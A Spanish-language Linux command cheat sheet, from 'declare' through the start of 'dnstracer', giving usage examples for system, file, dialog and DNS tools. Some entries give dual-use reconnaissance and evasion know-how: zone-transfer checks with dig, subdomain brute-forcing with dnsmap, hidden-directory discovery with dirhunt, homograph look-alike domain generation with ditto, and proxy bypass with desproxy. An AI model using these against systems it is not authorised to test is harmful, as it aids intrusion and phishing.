$ declare -f (Imprime las funciones alfabeticamente y su definición)
$ declare -f funcion (Mostrará la especificada)
$ declare -F (Lista sólo los nombres de la funciones)
$ declare -p var (Saber el tipo de la variable "var")
$ declare -i var=5 (Declarar una variable de tipo entero)


decode-dimms
Herramienta para decodificar la información que se encuentra en las EEPROMs SPD de los módulos de memoria. La herramienta requiere que se cargue un módulo del núcleo: eeprom, at24 o ee1004 (para DDR4 SDRAM.)
$ decode-dimms (información por pantalla)
$ decode-dimms -f (en formato .html)


deepin-terminal
Emulador de terminal avanzado con espacio de trabajo, múltiples ventanas, administración remota y otras características.
$ deepin-terminal


defaults
Permite leer y modificar los valores predeterminados de un usuario. Este programa reemplaza los antiguos programas dread, dwrite y dremove. Si se tiene acceso a la base de datos predeterminada de otro usuario, se puede incluir '-u nombre de usuario' antes de cualquier otra opción para usar la base de datos de ese usuario en lugar de la suya.
$ defaults readkey key (leer nombre predeterminado de todos los dominios)
$ defaults write domain key 'value' (escriba 'value' como 'key' predeterminada en el dominio [entre comillas simples])
$ defaults write domain dictionary (escriba 'diccionary' como reemplazo del dominio especificado. 'diccionary' debe ser una lista de propiedades entre comillas simples)
$ defaults write (lee la entrada estándar para valores predeterminados y los escribe en la base de datos)
$ defaults delete [ domain [ key] ] (eliminar los valores predeterminados especificados del 'domain'. Si no se proporciona ninguna 'key', elimine todo el dominio)
$ defaults delete (eliminar los valores predeterminados)
$ defaults domains (enumera los dominios en la base de datos uno por línea)
$ defaults find word (busca nombres de dominio, nombres predeterminados y cadenas de valores predeterminados iguales a la palabra 'word' y los enumera por pantalla)
$ defaults plist (información sobre las listas de propiedades)
$ defaults help (lista de opciones)


defmt-sh
Permite usar ispell con la opción -F para verificar scripts de shell y cualquier otro lenguaje que use "#" para comentarios y mismos estilos de comillas como C y C++ pero en este caso habla que usar el programa defmt-c
$ ispell -F defmt-sh (para scripts shell)
$ ispell -F defmt-c (para C y C++)


delgroup
Elimina un grupo del sistema
# delgroup grupo


delpart
Pide al núcleo Linux que se olvide de un dispositivo en la partición especificada (un número). Este comando no manipula particiones.
# delpart dispositivo partición


deluser
Elimina un usuario del sistema sin borrar su directorio.
# deluser usuario


delv
Utilidad de búsqueda y validación DNS. La aplicación enviará a un servidor de nombres especificado todas las consultas necesarias para obtener y validar los datos solicitados. La forma básica de ejecución es:
$ delv servidor nombre tipo (el servodor puede ser una dirección IP, una dirección IPv4 en notación decimal con puntos o una dirección IPv6 en notación delimitada por dos puntos. El nombre es el nombre de dominio que debe buscarse. El tipo de consulta puede ser cualquiera válido [ANY, A, MX, etc]. Si no se proporciona ninguno realizará una búsqueda de un registro A)


denyhosts
Protege contra ataques.
Configuración:
# nano /etc/denyhosts.conf
Algunas opciones:
	SECURE_LOG = /var/log/auth.log (Ruta a los logs)
	DENY_THRESHOLD_INVALID = 5 (Intentos fallidos permitidos con una cuenta que no existe)
	DENY_THRESHOLD_VALID = 5 (Intentos falllidos con usuarios validos)
	PURGE_DENY =5d (Tiempo de baneo de una IP. 5 dias en este caso)
	BLOCK_SERVICE = sshd (Servicios que queremos proteger [ sshd, ALL...)
Nota.- Tambien es posible arrancar el servicio con la opción "purge"  [/etc/init.d/denyhosts start --purge] para eliminar las ips bloqueadas y que se muestran en /etc/hosts.deny


depmod
Analiza los módulos del núcleo [/lib/modules/*] y crea una lista de dependencias. De forma predeterminada, esta lista se escribe en módulos.dep y una versión binaria con hash denominada módulos.dep.bin, en el mismo directorio.
$ depmod -a (Sondear todos los módulos. Opción predeterminada si no se proporcionan nombres de archivo en la línea de comandos)


descriptor
Toda aplicación tiene siempre tres descriptores de fichero abiertos, el 0 para la entrada estándar [stdin], el 1 para la salida estándar [stdout], y el 2 para la salida de errores estándar [stderr]. Del 3 al 9 son descriptores adicionales [ver tuberias]. En el ejemplo:
$ ls -a >> listado.txt
La salida estándart [descriptor 1] se envia al fichero listado.txt, consecuentemente en pantalla no veremos nada. En el caso:
$ ls -zy >> listado.txt
El error [descriptor 2] se mostrará por pantalla y listado.txt permanecerá vacio. Para redirigir el error [descriptor 2 ]al fichero listado.txt [descriptor 1]:
$ ls -zy >> listado.txt 2>&1


desktop-file-utils
Incluye los siguientes ejecutables: desktop-file-edit, desktop-file-install [instala un archivo de escritorio y lo ejecuta en el camino.], desktop-file-validate [ver] [valida un archivo de escritorio] y update-desktop-database [actualiza la asignación desktop-MIME]


desktop-file-validate
Herramienta para validar archivos de entrada de escritorio de acuerdo con la especificación Desktop Entry 1.0. La especificación describe un formato de archivo para proporcionar información como el nombre, el icono y la descripción de una aplicación.
$ desktop-file-validate --no-hints file.desktop(No proporcionar sugerencias sobre cosas que podrían mejorarse en el archivo de escritorio)
$ desktop-file-validate --no-warn-deprecated file.desktop (No adviertir sobre el uso de elementos obsoletos)
$ desktop-file-validate --warn-kde file.desktop (Advierte si se utilizan extensiones de KDE para la especificación)


desproxy
Permite realizar conexiones TCP/IP a través de proxies que solo ofrecen servicio http [puerto 80], de forma que, aunque el proxy este configurado para permitir únicamente la navegación web, podremos usarlo para acceder a otros servicios.


detex
Pasar un archivo latex a txt.
$ detex -n archivo.tex > archivo.txt


deurlname
[renameutils]. Elimina los caracteres codificados en la URL (como %20 que representa el espacio) de los nombres de los archivos. Algunos programas, por ejemplo w3m, tienden a mantener esos caracteres codificados en los archivos guardados. Útil para guardar archivos que se han descargado de Internet limpiando su URL.
$ deurlname omg%20ponnu%20ily%20kannu.mp3


devilspie
Permite especificar el comportamiento de las ventanas para que determinadas aplicaciones se abran en un escritorio concreto. Ha de colocarse en las aplicaciones de inicio.
$ mkdir .devilspie (Crear el directorio)
Crear por cada aplicación un archivo .ds en el directorio:
$ nano .devilspie/firefox.ds
Con el siguiente contenido a modo de ejemplo:
	(if
	  (is (application_name) "firefox")
	  (set_workspace 3)
	)
Cada vez que arranquemos firefox, se abrirá en el escritorio número 3.
Para saber el nombre de las aplicaciones que corren en cada escritorio:
$ nano .devilspie/debug.ds
Con el siguiente contenido:
	(debug)
Cuando arranquemos devilspie por consola, nos las mostrará.


dex
Programa para generar y ejecutar archivos DesktopEntry del tipo de Aplicación.
$ dex -ad (informa de los programas que se ejecutan en un arranque automático regular)
$ dex -a (Ejecutar todos los programas en el inicio automático)
$ dex -c /usr/bin/skype (Crear una DesktopEntry para un programa en el directorio actual)


df
Mostrar información de las particiones
$ df -h (los resultados en M y G, por defecto son en bytes)
$ df -a (de todas las particiones incluso las de 0 bloques)
$ df -t vfat (de las particiones especificadas, en el caso las vfat)
$ df -T (de todas las particiones y el tipo)


dglob
Expandir nombres o archivos de paquetes que coincidan con un patron.
$ dglob -a goodies (Buscar en todos los paquetes disponibles no solo en los instalados)
$ dglob -n goodies (Buscar en todos los paquetes disponibles sin incluir los instalados)


dgrep
Busqueda a través de archivos que pertenecen a un paquete Debian instalado.
$ dgrep goodies debian-goodies
$ dgrep dpigs debian-goodies


dhclient
Cliente DHCP
# dhclient eth0  (modifica la ip de la máquina)
# dhclient -v -r eth0 (Limpiar la ip actual)
# dhclient -v eth0 (solicitar ip)


dhcpcd
Configuración automática de la red dhcp
$ dhcpcd eth0


dhcping
Enviar una solicitud DHCP a un servidor DHCP para ver si está activo.
# dhcping -t 5 -s https://cloud.google.com/solutions/web-hosting (tiempo de espera 5 segundos, por defecto 3 y enviar un paquete al servidor especificado)
# dhcping -v -h 00:23:54:57:FC:78 -s 192.168.1.10 -c 192.168.1.15 (Mostrando la máxima información [v], la MAC del servidor DHCP [h] y su ip [s] y nuestra máquina [c])


dhelp
Leer toda la documentación de ayuda de debian con el navegador.
$ firefox file:///usr/share/doc/HTML/index.html


dhomepage
[debian-goodies]. Abre, si existe, en el navegador la página de información de un paquete debian.
$ dhomepage debian-history


di
Muestra información sobre las particiones com  df [ver] mejorado.
$ di
$ di -c (Salida en CSV, para importar una hoja de cálculo)


dialog
Muestra cuadros de diálogo para scripts
$ dialog --calendar "mes de junio" 0 0 1 6 2010  ("0 0" indica que se autodimensiona el cuadro. El tamaño estándar de una terminal es un ancho de 80 por un largo de 25. "1 6 2010" fecha con formato dia/mes/año)
$ dialog --checklist "Escoger servicios" 0 0 3 vnc "" "" ssh "" "" cups "" "" ("3" numero de entradas visibles, si hay más se usará el scroll. Las "" indican parámetros vacios que puedan sustituirse por palabras o números, el primero de los cuales aparecerá en el cuadro de diálogo [vnc 1 A ssh 2 B cups 3 C])
$ dialog --dselect /home/usuario/ 0 0  (mostrará el contenido del directorio mencionado)
$ dialog --editbox /etc/fstab 0 0   (mostrará el contenido del fichero seleccionado)
$ dialog --fselect /home/usuario/ 0 0  (Mostrará dos ventanas una con los directorios y la otra con los ficheros)
$ dialog --gauge "Uso del software libre" 0 0 0  (Muestra el progreso de un proceso)
$ for var in 0 10 20 30 40 50 60 70 80 90 100; do sleep 1; echo $var; done | dialog --gauge "Total completado" 6 60 0 (concatenación de dialogs)
$ dialog --infobox "Esto va a explotar...." 3 26  (Un cuadro con un texto)
$ dialog --sleep 3 --infobox "Esto va a explotar...." 3 26 (Vuelve al prompt a los 3 segundos)
$ dialog --sleep 3 --title "AVISO" --infobox "Esto va a explotar en 3 segundos...." 3 40; dialog --infobox "BOOOOOOOMMMM" 0 0 (Concatenación de dialogs)
$ dialog --inputbox "Ingrese su nombre" 0 0 (Solicitar una linea de texto al usuario)
$ dialog --passwordbox "Ingrese contraseña" 0 0 (Igual que inputbox pero no se muestra nada de lo que se ingresa en pantalla)
$ dialog --title "Aquí me las den" --no-cancel --inputbox "Dejame un mensaje cariño" 0 0 ""  (Especificando un título, sin el botón de "cancelar" y con cajón para dejar un mensaje)
$ dialog --inputmenu "Nombre del usuario" 0 0 3 " juan Perez" "c/ del Pulgar num 5" "Jose Gonzalez" "c/ pez num 11"  (Permite modificar el segundo concepto [La calle])
$ dialog --menu "Escoge una distro..." 0 0 3 1 "Arch" 2 "Red Had" 3 "Ubuntu" 4 "Debian"
$ dialog --mixedgauge "errores" 0 0 30 ubuntu distros
$ dialog --msgbox "\n Aquí puedes poner un texto" 0 0   (Avisar de una acción o comunicación y separando el texto de la parte superior [\n])
$ dialog --timeout 10 --clear --passwordbox "Entra la contraseña" 0 0 ""  (Especificando un tiempo para entrarla y limpiando la pantalla)
$ dialog --backtitle "Sobre timeout..." --timeout 5 --pause "Espera un rato..." 10 10 5   (Esperar 5 segundos antes de volver al prompt y con el título en la parte superior de la ventana [--backtitle])
$ dialog --radiolist "Escoger servicios" 0 0 3 vnc "" "" ssh "" "" cups "" ""  (parecido a checklist)
$ dialog --no-shadow --tailbox /etc/fstab 0 0   (Mostrar últimas lineas de un archivo sin sombreado de la ventana)
$ dialog --timebox "Tiempo de espera" 0 0 22 55 33
$ dialog --extra-button --timebox "Tiempo de espera" 0 0 22 55 33  (Incluir un boton extra)
$ dialog --defaultno --timebox "Tiempo de espera" 0 0 22 55 33  (Seleccionando por defecto "cancelar")
$ dialog --yesno "Quieres pasar a la siguiente opción?" 0 0 (Retornara un valor cero, si se selecciona YES o distinto de cero si se selecciona NO. Este valor se almacena en la variable $? y puede ser evaluado mediante un if, while,...)
$ dialog --tailbox /var/log/fail2ban.log 20 100 (muestra en tiempo real las incidencias en el fichero mencionado. Equivalente a tail -f)
Algunos ejemplos prácticos de su uso en scripts:
1.-
#!/bin/bash
dialog --menu "Opciones del script" 16 60 14 1 "Puertos abiertos" 2 "Intentos de acceso" 3 "las IPs externas e internas" 4 "Cantidad de intentos de ataques" 5 "Servicios activos" 6 "Salir"
clear
2.-
#!/bin/bash
# Escanear puertos abiertos
nmapResultat=$(sudo nmap -O localhost | grep "open" | awk '{print$1,$3}')
dialog --title "Resultado del escaneo de puertos" --msgbox "Los puertos abiertos son:
$nmapResultat" 0 0
clear
3.-
#!/bin/bash
# Parar un servicio
dialog --title "samba" --yesno "Quieres detener samba?" 0 0
case $? in
0)
sudo /etc/init.d/samba stop
dialog --title "Info" --msgbox "samba detenido" 0 0;;
1)
dialog --title "Info" --msgbox "samba continua activo" 0 0 ;;
255)
dialog --title "Info" --msgbox "ESC presionado... samba activo" 0 0 ;;
esac
clear
$ dialog --title "Mensaje al mundo" --msgbox "\n      Hola a todos" 6 35
$ dialog --yesno "¿Estás de acuerdo?" `tput lines` `tput cols`
$ dialog --menu "Escoger interfaz" 0 0 0 g "gnome" k "kde" x "xfce" 2>&1
4.-
#!/bin/bash
# Respuestas  como variables
TMPFILE="/tmp/scripttemp.$$"
dialog --inputbox "Ingrese su nombre" 10 30 2> $TMPFILE
N=`cat $TMPFILE`
dialog --inputbox "Ingrese su edad" 10 30 2> $TMPFILE
E=`cat $TMPFILE`
# Borrar tmpfile
rm -f $TMPFILE
dialog --infobox "$N tiene $E años" 3 50


diceware
Generador de frases de contraseña concatenando palabras seleccionadas al azar de un fichero con una lista de palabras que es opcional.
$ diceware
$ diceware -n 3 -c -s 4 -d ? (concatenando 3 palabras, con mayusculas, insertar 4 caracteres especiales y seprando las palabras con un ?)


dict
Diccionario en inglés.
$ dict linux


dictzip
Utilidad para comprimir bases de datos de diccionarios [.dict] con el algoritmo LZ77, útil para reducir su tamaño y hacer que sean más eficientes de almacenar y transferir. Incluye dictunzip [descomprimir] y dictzcat [visualizar archivos comprimidos].
$ dictzip diccionario.dict (genera un archivo comprimido llamado diccionario.dict.dz)
$ dictzip -d diccionario.dict.dz (devuelve el archivo a su forma original)
$ dictzip -l diccionario.dict.dz (muestra detalles como el tamaño comprimido y descomprimido del archivo)
$ dictzip -c 9 diccionario.dict (aplica la compresión máxima al archivo)
$ dictzip -k diccionario.dict (comprimir un archivo y mantener el original sin cambios)
$ dictzip -c diccionario.dict > nuevo_diccionario.dict.dz (redirige el archivo comprimido a nuevo_diccionario.dict.dz en lugar de usar el nombre predeterminado)


didiwiki
wiki rápida y ligera para uso personal.
$ didiwiki -h /home/USER -l 127.0.0.1 -p 5000
En el navegador colocar la dirección http://localhost:5000 y se vera el directorio especificado.


diff
Mostrar diferencias entre dos directorios o ficheros
$ diff archivo1 archivo2 (Compara diferencias entre dos ficheros)
$ diff -r carpeta1 carpeta2 (Compara diferencias de forma recursiva en los directorios)
$ diff -w fichero1 fichero2  (Descarta espacios en blanco)
$ diff -q fichero1 fichero2   (Informa si los ficheros difieren sin mostrar detalles)
$ diff -y fichero1 fichero2   (Muestra la salida a dos columnas)
$ diff –urp dir1 dir2 (Compara recursivamente el contenido de 2 directorios.)
$ diff -ru carpeta_original carpeta_modificada > parche.patch (Compara de forma recursiva dos directorios y genera un parche en un fichero .patch con formato unificado de diff)
$ diff -u <(grep -vE '^(#|$)' file1) <(grep -vE '^(#|$)' file2)  (Los compara ignorando comentarios y lineas en blanco)


diffimg
Genera una imagen donde cada píxel es la diferencia entre el píxel correspondiente en cada una de las dos imágenes de origen. Por lo tanto, si las imágenes de origen son las mismas, la imagen resultante será negra; de lo contrario, tendrá regiones no negras donde las imágenes difieren. Accepta .png, .gif y .jpg.
$ diffimg imagen1.png imagen2.png


diffmon
Monitorear archivos del sistema. El archivo donde especificar lo que se han de controlar es /etc/diffmon/diffmon.cf. Está diseñado para ejecutarse como un trabajo cron
$ diffmon


diffoscope
Comparar de forma recursiva archivos de muchos tipos [binarios, tarbals, imágenes ISO, pdfs...]. Las diferencias se pueden mostrar como texto o HTML. Los diversos comparadores dependen de comandos externos.
$ diffoscope --list-tools (lista los comandos expernos que se precisan)
$ diffoscope --html salida.html archivo1.txt archivo2.txt
$ diffoscope --text salida.txt archivo1.txt archivo2.txt


diffpdf
Compara dos archivos pdf.
$ diffpdf archivo1.pdf archivo2.pdf


dig
[dnsutils]. Realizar consultas a los servidores DNS
$ dig tuxapuntes.com
$ dig telefonica.net DNS  (Mostrando los servidores DNS del dominio)
$ dig -x 74.220.215.64 (Resolución inversa)
Nota.- Los datos importantes en la “ANSWER SECTION”
$ dig +short myip.opendns.com @resolver1.opendns.com (muestra IP externa)
$ dig tuxapuntes.com somedomainname.net axfr   (mirar si un dominio es susceptible de ataques axfr)
$ dig +trace tuxapuntes.com (Ver saltos de la petición hasta el servidor)
$ dig ANY tuxapuntes.com (Consultar todos los registros de la zona DNS)


digup
és una eina per actualitzar fitxers md5sum o shasum digest. Llegirà els fitxers de resum existents, comprovarà el directori actual si hi ha fitxers nous, actualitzats, modificats, canviats de nom o eliminats i consultarà a l'usuari amb un resum dels canvis. Després de revisar les actualitzacions, es poden escriure de nou al fitxer de resum.
$ digut (scanea el directorio y entra en el prompt de digup)
  Command (see help)? new (imprime los archivos modificados. Si es la primera vez que se lanza los pondrá todos)
Si al cabo de unos dias se vuelve a lanzar.
  Command (see help)? changed (mostrará los modificados)
  Command (see help)? deleted (mostrará los eliminados)
  Command (see help)? help (ver las opciones disponibles)
  Command (see help)? exit (salir)


ding
Avisa con un pitido pasado determinado tiempo o a una hora especificada. descarga <https://github.com/liviu-/ding>
$ ding in 1h 15m (que avise en una hora y cuarto)
$ ding at 14:45:30 (A una hora, minuto y segundo concreto)


dir
listar el contenido del directorio.
$ dir -a (todo con archivos ocultos)
$ dir -A (sin archivos ocultos)
$ dir --color (con colores)
$ dir -C (por olumnas y orden alfabetico)
$ dir -c (por orden de modificación)


dircolors
Configuración de color para ls.
$ dircolors -b (generar el código de shell para establecer la variable LS_COLORS)
$ dircolors --print-ls-colors (mostrar colores)


directorylister
Un simple script en PHP creado para compartir el contenido de un directorio y sus subdirectorios via web. Descarga: <http://www.directorylister.com/> Colocar la carpeta en el directorio web.
$ cd DirectoryLister
$ mv README.md COMPYING resources
$ cd resources
$ cp default.config.php config.php
Modificar lo que proceda. Todos los archivos o carpetas que pongamos en el directorio que contiene el index.php se verá reflejado cuando accedamos a htt://localhost/DirectoryLister.


direnv
Permitir variables de entorno específicas de un proyecto sin tener que añadirlas a ~/.profile o archivos relacionados para no saturarlos y comprueba la existencia de un archivo ".envrc" en el directorio actual, si el archivo existe, se carga en un subshell y direnv captura todas las variables y las pone a disposición de la shell.
$ direnv stdlib (genera un script bash llamado stdlib que carga .envrc y el archivo ~/.config/direnv/direnvrc si existe)
$ direnc prune (elimina archivos antiguos permitidos)
$ direnv reload (recarga de entorno)
$ direnv status (imprime información de estado de depuración)
$ direnv allow (cada vez que se modifiquen .envrc y .secrets.)
$ direnv edit (muestra el contenido de .envrc)
$ direnv grant (cargar el archivo .envrc o .env)


dirhunt
Encontrar directorios en sitios web aunque el servicio no esté habilitado (<https://github.com/Nekmo/dirhunt>)
$ dirhunt http://dominio.com http://dominio2.com (escanear dos urls)
$ dirhunt http://dominio.com -e php,zip,sh (buscar determinadas extensiones. Por defecto php, zip, sh, asp, csv y log)
$ dirhunt http://dominio.com -f access_log,error_log (buscar determinados archivos)
$ dirhunt http://dominio.com --stdout-flags blank,not_found.fake,html > flags.txt (especificar flags y guardarlo en un fichero)


dirname
Eliminar el último componente de un archivo.
$ dirname /usr/bin (Muestra sólo /usr)


dirs
Ver pushd


discover
Sistema de identificación de hardward. Realiza detección de hardware en el momento del arranque. La información se almacena en el archivon /lib/discover/list.xml que puede visualizarse con el navegador.
$ discover


discus
Utilidad similar a df para verificar el uso de espacio en disco.
$ discus (lanzamiento básico)
$ discus -d -p 2 -m (mostrando nombres de los dispositivos, el uso de espacio con 2 dígitos y en megabytes)


disktype
Detección de formatos de disco [sistemas de archivo, particiones, volumenes, imagenes, archivos comprimidos...]
# disktype /dev/sda2
$ disktype imagen.iso
$ disktype archivo


disown
Disociar un proceso de la terminal que lo lanzó. Cuando creamos un proceso desde una terminal, éste queda ligado a la terminal. Si se cierra la terminal, también se cierra el proceso. disown evita tal contingencia. Veamos el proceso:
Si se lanza:
$ yes > /dev/null
Cerramos y volvemos a abrir la terminal y ejecutamos:
$ ps aux | grep yes | grep -v grep
Veremos que el proceso no existe. Si volvemos a lanzar "yes":
$ yes > /dev/null
Pulsamos Ctrl+z:
[1]+  Detenido                  yes > /dev/null
Lanzando:
$ jobs
Nos mostrará la misma salida. Ahora en el promt escribimos:
$ disown -h %1
Con lo que desligamos el proceso de la terminal. Hemos liberado la terminal pero si la cerramos, aún matamos el proceso "yes". Para que esto no ocurra, lo mandamos a segundo plano con bg y número de proceso [1]:
$ bg 1
[1]+ yes > /dev/null &
Ahora podemos cerrar la terminal sin que el proceso "yes" se vea afectado. El proceso se simplifica si ya lanzamos el comando en background:
$ yes > /dev/null &
[1] 13248
Lo disociamos de la terminal:
$ disown -h %1
Y ya podemos cerrar la terminal sin afectar al proceso.
Otras opciones:
$ disown -a (Desliga todos los procesos ejecutados desde la terminal)
$ disown -r (Desliga los que esten en marcha [running])


display
[imagemagick]. Visualizar imagenes en las X.
$ display imagen.jpg
$ DISPLAY=:0.0 gedit  (lanzado desde una tty, abre gedit en las X. Si solo tenemos una sesión X corriendo, puede suprimirse el “.0”)
$ gxmessage “Cierra el firefox” -display :0 (Lanzado desde una tty mostrará el mensaje en las X)


distro-info
Información sobre las versiones de Debian.
$ distro-info --all (muestra todas las que se han publicado)
$ distro-info --stable (la stable actual)
$ distro-info --testing (la testing actual)


ditaa
Transforma caracteres ascii en mapas de bips.
$ nano grafic.txt
	+--------+   +-------+    +-------+      /-------\
	| c1FF   | --+ text  +--> | cBLK  |      | Text  |
	|  Text  |   +-------+    | Text  | ---> |       |
	|        |   | Text  |    |   +---+      |  cBLU |
	|     {d}|   | cGRE  |    |   | B |      \-------/
	+---+----+   +-------+    +---+---+
	    :              +----+    ^  |
	    |       text   |cRED|    |  |
	    +--------------+----+----+  |
	                   |cC02|       +-----------+
	                   +----+     +-+---+       |
	                              |c1AB |       |
	                              |text |<------+
	                              +-----+
$ ditaa grafic.txt grafic.png


ditto
Herramienta para generar variantes con caracteres parecidos [homógrafos] de un dominio. Puede causar un baneo temporal de los servidores de WHOIS.
$ ditto -string palabra (sobre una palabra)
$ ditto -domain nombre.com (sobre un dominio)
$ ditto -domain nombre.com -available (que muestre solo los disponibles)
$ ditto -domain facebook.com -registered (mostrar solo los registrables)


djvm
Manipular documentos .djvu
$ djvm -l fichero.djvm (Lista el contenido)
$ djvm -c archivo.djvu file1.djvu file2.djvu (Crea un archivo juntando varios archivos djvu)
$ djvm -d archivo.djvu 0022 (Eliminar la página 22 del archivo.djvu)


djvudump
Mostrar la estructura interna de los archivos DjVu.
$ djvudump archivo.djvu


djvusmooth
Visor y manipulador gráfico de documentos djvu.
$ djvusmooth archivo.djvu


dlint
Analiza cualquier zona DNS que se especifique e informa de cualquier problema que encuentre mostrando errores y advertencias.
# dlint lapipaplena.org


dmesg
Imprimir en pantalla los mensajes del kernel
$ dmesg | grep -i 'error'   (lista los errores del kernel)
$ dmesg | grep hd           (inf sobre dispositivos IDE.)
$ dmesg -c (Limpiar el registro)
$ dmesg -T (Que muestre la hora)


dmidecode
Muestra toda la información de la máquina directamente de la BIOS
# dmidecode -t (muestra los elementos sobre los que se puede solicitar)
# dmidecode -s (Muestra el listado para afinar más la busqueda de datos)
# dmidecode -t memory | grep Size (muestra la memoria y los slots libres)
# dmidecode -t processor | grep "Core Count"  (número de “cores” reales)
# dmidecode | grep "Current Speed"  (muestra la frecuencia de la RAM)
# dmidecode -t 0  (información sobre la BIOS)
# dmidecode -t 1  (informacion del fabricante: núm serie, producto...)
# dmidecode -t 2 (información sobre la placa base)
# dmidecode -t 4  (información sobre la CPU)
# dmidecode --type=processor | grep -i -A 1 charac (si el procesador es de 32 o 64 bit)
# dmidecode -t memory | grep Maxi | grep Capa (máximo  de memoria soportada)


dmrc
En algunas ocasiones al iniciar ubuntu aparece la siguiente nota:
su archivo $HOME/.dmrc no tiene los permisos adecuados y sera ignorado. Esto causara que la sesion e idioma predeterminado no se guarden. El archivo deberia pertener al usuario y tener los permisos 644
Para solucionarlo:
# chmod 700 /home/usuario
# chmod 644 /home/usuario/.dmrc


dnf
Sistema de administración de paquetes predeterminado en la mayoría de distribuciones basadas en RPM.
# dnf upgrade (actualizar listado)
# dnf group list (listar todos los grupos de paquetes)
# dnf group info "nombre grupo" (información de un grupo)
# dnf group install "nombre grupo" (instalar todos los paquetes de un grupo)
# dnf group remove "nombre grupo" (eliminar un grupo de paquetes)
# dnf list all (listar todos los paquetes instalados y disponibles)
# dnf list installed (listar todos los instalados)
# dnf list available (listar todos los disponibles)
# dnf list available paquete (ver todos los paquetes relacionados con "paquete" disponibles)
# dnf info paquete (buscar información sobre "paquete")
# dnf search paquete (buscar paquete)
# dnf install paquete (instalar "paquete")
# dnf remove paquete (desinstalar "paquete")
# dnf install paquete1 paquete2 paquete3 (instalar varios paquetes)


dns
El servidor DNS traduce los numeros ip a nombres inteligibles para los seres humanos. Estos servicios estan vinculados a los ISP, es decir, a nuestros proveedores de acceso a Internet. Sin embargo estas ips pueden ser modificadas para conseguir mejores rendimientos o por manias personales con algunas opciones mas libres o profesionales. La manera de saber si el servidor DNS responde correctamente es hacer un ping consistente en enviar una pequeña cantidad de información al servidor y medir la velocidad en milisegundos de la respuesta. Valores inferiores a 70 ms (Al final de la linea [time=62.9 ms]) son razonables:
$ ping -c 3 8.8.8.8
Algunas opciones a las ofrecidas por nuestras ISP:
	Google -> 8.8.8.8,	8.8.4.4
	OpenDNS -> 208.67.222.222, 208.67.220.220
	Level3 -> 4.2.2.1, 4.2.2.2, 4.2.2.3, 4.2.2.4, 4.2.2.5 y 4.2.2.6
	Dyn -> 216.146.35.35, 216.146.36.36
	DNSadvantage -> 156.154.70.1, 156.154.71.1
Ona vez escogidas las DNSs:
# nano /etc/resolv.conf
Colocar:
	nameserver 4.2.2.1
	nameserver 4.2.2.2
Nota.- Comentar o borrar las existentes.
Para evitar que network-manager sobreescriba el archivo resolv.conf, bloquear el fichero:
# chattr +i /etc/resolv.conf (Para desbloquearlo -i)


dnscrypt
Cifrar el tráfico DNS.
$ wget https://github.com/downloads/opendns/dnscrypt-proxy/dnscrypt-proxy-1.2.0.tar.gz
$ tar xvvf dnscrypt-proxy-1.2.0.tar.gz
$ cd dnscrypt-proxy-1.2.0/
$ ./configure
$ make
# make install
# dnscrypt-proxy --daemonize (Arrancar el demonio)
Modificar las DNSs en:
# nano /etc/resolv.conf
Colocar:
nameserver 127.0.0.1
Nota.- Comentar las existentes.
Para evitar que network-manager sobreescriba el archivo resolv.conf, bloquear el fichero:
# chattr +i /etc/resolv.conf (Para desbloquearlo -i)


dnsdiag
Herramientas [dnseval, dnsping y dnstraceroute] para realizar auditorías básicas de solicitudes y respuestas DNS.


dnsdomainname
Muestra el nombre del dominio DNS del sistema.
$ dnsdomainname


dnsenum
[cpanminus libnet-dns-perl libnet-netmask-perl libxml-writer-perl]. Herramienta diseñada con el propósito de consultar los servidores DNS de un dominio. Descarga: <https://github.com/fwaeytens/dnsenum> . Previamente lanzar:
# cpanm String::Random
# perl dnsenum.pl URL
# perl dnsenum.pl --noreverse -o resultado.xml URL (Evitar operaciones de búsqueda inversa y guardando el resultado en un fichero)


dnseval
[dnsdiag]. Evalúa múltiples resoluciones de DNS y ayuda a elegir el mejor servidor DNS para su red. Se recomienda utilizar su propio dispositivo de resolución de DNS en lugar de un servidor DNS de terceros, pero en caso de que necesite elegir el mejor reenviador de DNS para su red, dnseval le permite comparar diferentes servidores DNS en relación al rendimiento, lae latencia y la fiabilidad.
# dnseval -T facebook.com (forma básica)
# dnseval -t A -f public-servers.txt -c 20 yahoo.com (Clase de registro "A", de una lista de servicios DNS y 20 solicitudes a enviar a yahoo.com)


dnsmap
Herramienta que, mediante fuerza bruta, permite obtener los subdominios de un dominio.
$ dnsmap url (forma básica)
$ dnsmap url -w words.txt -r resultado.txt (Usando un diccionario [w] y derivando el resultado a un fichero [r])
Nota.- Descarga de diccionarios en <http://packetstormsecurity.org/Crackers/wordlists/dictionaries/>


dnsmasq
Para que el ordenador guarde en cache las páginas visitadas y no vuelva a resolver las ips con el servidor DNS:
# gedit /etc/resolv.conf
Independientemente de que existan más lineas indicando otras ips, añadir la siguiente:
nameserver 127.0.0.1
Y para distribuir la carga entre varios servidores, añadir la linea:
options timeout:1 rotate attempts:1
Comprobar el correcto funcionamiento:
$ dig tuxapuntes.com | grep Query
;; Query time: 369 msec
Volver a lanzar dig:
$ dig tuxapuntes.com | grep Query
;; Query time: 0 msec
Si nuestra IP es dinámica, NetworkManager nos modificará cada cierto tiempo el archivo /etc/resolv.conf, para substituir el creado automaticamente por el nuestro:
# cp /etc/resolv.conf /etc/resolv.conf.local (Asegurándonos que este último tiene la linea “nameserver 127.0.0.1”)
# crontab -e
*/3 * * * * cp /etc/resolv.conf.local /etc/resolv.conf (actualizar cada 3 minutos)


dnsping
[dnsdiag]. Se usa para medir el tiempo de respuesta de un servidor DNS dado para solicitudes arbitrarias. Al igual que una utilidad de ping tradicional, proporciona una funcionalidad similar para las solicitudes de DNS.
# dnsping dnsdiag.org (forma básica)
# dnsping -c 3 -t A -s 8.8.8.8 dnsdiag.org (3 solicitudes de registro "A" usando las DNSs de google)


dnstop
Monitorear el tráfico dns.
# dnstop -i 192.168.1.3 -p -r 2 eth0 (Excluir la propia máquina [i], en modo no promiscuo [p], actualizando cada 2 segundos [r] y la red objetivo)
En la mayoria de los casos, lo normal en lanzar:
# dnstop eth0
Y realizar las consultas de forma interactiva pulsando las siguientes teclas:
	s (visualizar las direcciones de origen)
	d (visualizar las direcciones de destino)
	t (desglosar por tipo)
	r (mostrar el desglose de los códigos de respuesta)
	1 (mostrar consulta de primer nivel [.com, .net, .info])
	2 (mostrar consulta de segundo nivel)
	3 (mostrar consulta de tercer nivel)
	! (mostrar fuente y consulta de primer nivel)
	@ (mostrar fuente y consulta de segundo nivel)
	# (mostrar fuente y consulta de tercer nivel)
	Ctrl + r (Reinicia el contador)
	? (Muestra la ayuda)
	Ctrl + x (Salir)


dnstracer
